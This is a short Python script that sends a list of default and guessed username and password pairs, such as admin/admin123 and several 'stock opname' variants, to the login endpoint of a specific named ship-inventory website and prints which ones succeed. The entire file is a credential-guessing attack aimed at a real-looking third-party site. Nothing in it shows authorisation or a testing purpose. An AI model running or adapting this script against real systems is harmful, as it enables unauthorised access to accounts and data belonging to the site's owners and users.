import requests

base_url = "https://sertifikasibag.com/inventory_kapal/api"

candidates = [
    ("admin", "admin123"),
    ("admin", "admin"),
    ("logistik", "logistik123"),
    ("logistik", "logistik"),
    ("stock opname", "stock opname"),
    ("stock opname", "stockopname"),
    ("stock opname", "stock_opname"),
    ("stockopname", "stockopname"),
    ("stock_opname", "stock_opname"),
    ("stock opname", "123456"),
    ("stock opname", "admin123"),
]

for username, password in candidates:
    payload = {
        "username": username,
        "password": password
    }
    try:
        response = requests.post(f"{base_url}/auth.php", json=payload, timeout=5)
        if response.status_code == 200:
            print(f"SUCCESS: {username} / {password}")
            print(response.json())
        else:
            print(f"FAILED: {username} / {password} - {response.status_code}: {response.text}")
    except Exception as e:
        print(f"ERROR: {username} / {password} - {e}")
